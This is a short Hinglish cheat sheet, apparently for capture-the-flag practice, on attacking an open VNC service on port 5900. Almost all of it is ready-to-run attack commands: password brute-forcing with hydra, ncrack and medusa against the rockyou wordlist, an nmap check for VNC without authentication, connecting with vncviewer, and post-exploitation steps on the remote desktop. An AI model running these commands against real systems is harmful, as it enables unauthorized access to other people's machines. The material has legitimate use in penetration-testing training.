# 🔓 VNC PORT OPEN (5900) — Ab Kya?

---

## CASE 1: Brute Force VNC Password
```bash
hydra -P /usr/share/wordlists/rockyou.txt <IP> vnc -t 4
ncrack -vv -p 5900 --user "" -P /usr/share/wordlists/rockyou.txt <IP>
medusa -h <IP> -M vnc -P /usr/share/wordlists/rockyou.txt
```
> VNC sirf password hai — no username

---

## CASE 2: Connect via VNC
```bash
vncviewer <IP>:5900
# Password daalo jo crack hua

# Ya Remmina (GUI tool) use karo
```

---

## CASE 3: VNC Auth Bypass Check
```bash
nmap --script vnc-info,vnc-brute -p 5900 <IP>
# Kabhi kabhi "No authentication" hota hai
```

---

## CASE 4: Connected — Post Exploit
> VNC = remote desktop access. GUI milega.
> Desktop pe files dhundo, terminal kholo, flag dhundo.

---

## QUICK DECISION:
```
VNC open (5900)
  ├─ No auth? → direct vncviewer connect
  ├─ Brute force: hydra -P rockyou.txt <IP> vnc
  └─ Connected → GUI access → flag dhundo desktop pe
```
